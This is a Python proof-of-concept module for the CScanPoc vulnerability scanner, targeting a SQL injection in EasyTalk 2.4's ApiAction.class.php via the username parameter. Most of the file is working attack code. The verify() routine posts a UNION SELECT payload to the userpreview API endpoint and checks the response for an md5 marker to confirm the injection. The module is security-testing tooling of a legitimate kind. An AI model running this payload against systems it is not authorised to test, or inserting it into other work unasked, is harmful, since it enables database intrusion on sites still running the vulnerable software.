# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse
import re


class Vuln(ABVuln):
    vuln_id = 'EasyTalk_0001_p'  # 平台漏洞编号，留空
    name = 'EasyTalk 2.4 /Home/Lib/Action/ApiAction.class.php SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-05-10'  # 漏洞公布时间
    desc = '''
        EasyTalk 2.4 /Home/Lib/Action/ApiAction.class.php 文件参数username变量未合适过滤，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=50344'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'EasyTalk'  # 漏洞应用名称
    product_version = '2.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1c7e6670-838e-4209-ac53-7c5009b82318'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-06'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_url = '{target}'.format(
                target=self.target) + r'/?m=api&a=userpreview'
            post_content = r'''username=sqlinjectiontest' UNION SELECT NULL,NULL,NULL,NULL,'''\
                '''NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,'''\
                '''NULL,NULL,NULL,NULL,md5('sqlinjectiontest'),NULL,NULL,NULL,'''\
                '''NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#'''
            request = urllib.request.Request(verify_url, post_content)
            response = urllib.request.urlopen(request)
            content = str(response.read())
            if '526ae11a7ea509bd8338660e908ce9e0' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
